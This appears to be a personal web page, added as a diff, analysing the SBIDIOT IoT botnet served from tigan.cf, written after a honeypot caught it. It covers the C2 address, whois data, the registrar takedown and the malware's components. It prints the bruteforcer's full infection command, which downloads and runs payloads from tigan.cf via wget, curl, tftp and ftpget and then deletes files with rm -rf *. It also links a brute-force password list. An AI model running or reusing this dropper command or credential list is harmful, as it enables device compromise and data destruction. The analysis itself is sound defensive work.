@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<!-- Written in vim :) -->
+<html>
+<head>
+<title>tigan.cf</title>
+<link rel="stylesheet" type="text/css" href="https://people.rit.edu/sjf5462/main.css"/>
+<style>
+code{
+}
+</style>
+</head>
+<script src="//instant.page/5.1.0" type="module" integrity="sha384-by67kQnR+pyfy8yWP4kPO12fHKRLHZPfEsiSXR8u2IKcTdxD805MGUXBzVPnkLHw"></script>
+<body>
+
+<h1><b> SBIDIOT/tigan.cf malware </b></h1>
+
+<p>
+I noticed a domain, tigan.cf, was being used to serve malware. The malware also seems to use one IP address as it's C2 server (54.37.79.0, over port 666). Usually, botnets use a distributed C2 architecture, making them difficult to take down. Since this malware is centralized it's easy to take down.
+</p>
+
+<p> (Update: they changed their C2 and host from an IP address now) </p>
+
+<p>
+Output of whois tigan.cf:
+</p>
+
+<code>
+Domain name:</br>
+TIGAN.CF</br>
+</br>
+Organisation:</br>
+Centrafrique TLD B.V.</br>
+Dot CF administrator</br>
+P.O. Box 11774</br>
+1001 GT  Amsterdam</br>
+Netherlands</br>
+Phone: +31 20 5315725</br>
+Fax: +31 20 5315721</br>
+E-mail: abuse: abuse@freenom.com, copyright infringement: copyright@freenom.com</br>
+</br>
+Domain Nameservers:</br>
+BETH.NS.CLOUDFLARE.COM</br>
+LYNN.NS.CLOUDFLARE.COM</br>
+</br>
+</br>
+Your selected domain name is a Free Domain. That means that,</br>
+according to the terms and conditions of Free Domain domain names</br>
+the registrant is Centrafrique TLD B.V.</br>
+</br>
+Due to restrictions in Dot CF 's Privacy Statement personal information</br>
+about the user of the domain name cannot be released.</br>
+</br>
+ABUSE OF A DOMAIN NAME</br>
+If you want to report abuse of this domain name, please send a</br>
+detailed email with your complaint to abuse@freenom.com.</br>
+In most cases Dot CF responds to abuse complaints within one business day.</br>
+</br>
+COPYRIGHT INFRINGEMENT</br>
+If you want to report a case of copyright infringement, please send</br>
+an email to copyright@freenom.com, and include the full name and address of</br>
+your organization. Within 5 business days copyright infringement notices</br>
+will be investigated.</br>
+</br>
+Record maintained by: Dot CF Domain Registry</br>
+</code>
+
+<p>
+I sent an email to the abuse contact provided, and they took down the site! I first saw the site 2021-12-03, and there was 7 total attempts on my server from 5 unique IP addresses. The site was shutdown on 12/13/2021. The malware itself is made of a few bash scripts and binaries. The binaries are packed with UPX, but the 'UPX!' string is replaced with YTX™. There was one sample labeled 'haiduc' that uses the library libssh. This seems to be a SSH bruteforcer. One of the bash scripts, go, runs haiduc with these arguements.  
+</p>
+
+<code>./haiduc $threads -f i pass.fnl $port "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://tigan.cf/sh; curl -O http://tigan.cf/sh; chmod 777 sh; sh sh; tftp tigan.cf -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g tigan.cf; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 tigan.cf .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *"
+</code>
+
+<p>
+The variables $threads and $port where set to 1500 and 22 respectively. The file pass.fnl is a password list, which matches up to the credentials used against my honeypot. The command given as a string also matches up to the command the bot ran. The file 'x86.keen.onion.1337' seems to be the C2 agent. The string 54.37.79.0:666 is embedded inside it. It also had strings such as "HTTPSTOMP", "CRUSH", and "STOP". It seems that these are commands that the malware can act on. According to the linked article, many of the commands are used for DOS.
+</p>
+
+<div><a href="https://www.nozominetworks.com/blog/threat-intelligence-analysis-of-the-sbidiot-iot-malware/">Article</a></div>
+<div><a href="https://www.joesandbox.com/analysis/530262/0/pdf">Link to sandbox report</a></div>
+<div><a href="pass.txt">Password list</a></div>
+<div><a href="../">../</a></div>
+</body>
+</html>
